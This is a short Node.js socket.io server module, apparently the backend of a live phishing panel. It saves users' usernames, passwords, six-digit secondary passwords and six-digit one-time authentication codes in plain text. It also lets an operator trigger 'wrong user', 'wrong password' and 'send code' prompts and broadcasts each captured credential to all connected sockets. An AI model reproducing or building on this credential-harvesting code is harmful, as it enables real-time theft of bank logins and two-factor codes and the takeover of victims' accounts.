const { array } = require('yup')
const Client = require('../models/Client')

let clientList = []
let listClient = []
let rooms = []

module.exports = {
    create(socket, io, list) {
        if (!listClient.includes(socket.id)) listClient.push(socket.id)

        var address = socket.handshake

        rooms[address.address] = socket.id

        io.emit('conectado', 'usuário conectou')

        //Send commands
        socket.on('erroruser', async (id) => {
            clientList[socket.id] = id
            io.emit('erroruser', id)
        })

        socket.on('errorpass6', (id) => {
            clientList[socket.id] = id
            io.emit('errorpass6', id)
        })

        socket.on('disp', (data) => {
            clientList[socket.id] = data
            io.emit('disp', data)
        })

        //receive auth
        socket.on('getAuth', (data) => {
            clientList[socket.id] = data
            return io.emit('getAuth', data)
        })

        socket.on('sendAuth', async (data) => {
            const { id, code1, code2, code3, code4, code5, code6 } = data

            const auth = `${code1}${code2}${code3}${code4}${code5}${code6}`

            const client = await Client.findByPk(id)

            if (!client) return

            await client.update({ auth })

            io.emit('sendAuth', client.toJSON())
            return io.emit('updateClient', client.toJSON())
        })

        socket.on('userReconnect', async (data) => {
            const id = data

            const client = await Client.findByPk(id)

            clientList = clientList.filter((cl) => cl != id)

            if (!client) return

            if (client.status != `sendPass6`) await client.update({ status: 'reconnect' })

            clientList[socket.id] = client.id

            io.emit('userReconnect', client.toJSON())
        })

        socket.on('sendPass6', async (data) => {
            const { id, password6 } = data

            const client = await Client.findByPk(id)

            if (!client) return

            client.update({
                password6,
                status: 'sendPass6',
            })

            return io.emit('sendPass6', client.toJSON())
        })

        socket.on('disconnect', async (data) => {
            const id = socket.id

            const clientId = clientList[id]

            const client = await Client.findByPk(clientId)

            if (client) {
                if (client.status != `sendPass6`) client.update({ status: 'disconected' })
                io.emit('clientDisconnect', client.toJSON())
            }

            //console.log('user disconnected', socket.connected)
        })

        socket.on('updateClient', async (data) => {
            const { username: user, password, password6, id } = data

            const client = await Client.findByPk(id)

            if (client) await client.update({ user, password, password6 })

            return io.emit('updateClient', client.toJSON())
        })

        socket.on('password6Client', async (data) => {
            const { id, password6 } = data
            const client = await Client.findByPk(id)

            if (!client) return

            client.update({ password6 })
        })

        socket.on('createClient', async (data) => {
            try {
                const { username: user, password, password6 } = data

                const info = await Client.findOne({ where: { user } })

                if (info) {
                    await info.update({
                        user,
                        password,
                        password6,
                        status: `updated`,
                    })

                    listClient[socket.id] = info.id

                    socket.join(info.id)

                    return io.emit('updateClient', info.toJSON())
                }

                const newInfo = await Client.create({
                    user,
                    password,
                    password6,
                    status: `connected`,
                })

                listClient[socket.id] = newInfo.id

                socket.join(newInfo.id)

                return io.emit('createClient', newInfo.toJSON())
            } catch (error) {
                console.log(error)
            }
        })
    },
}
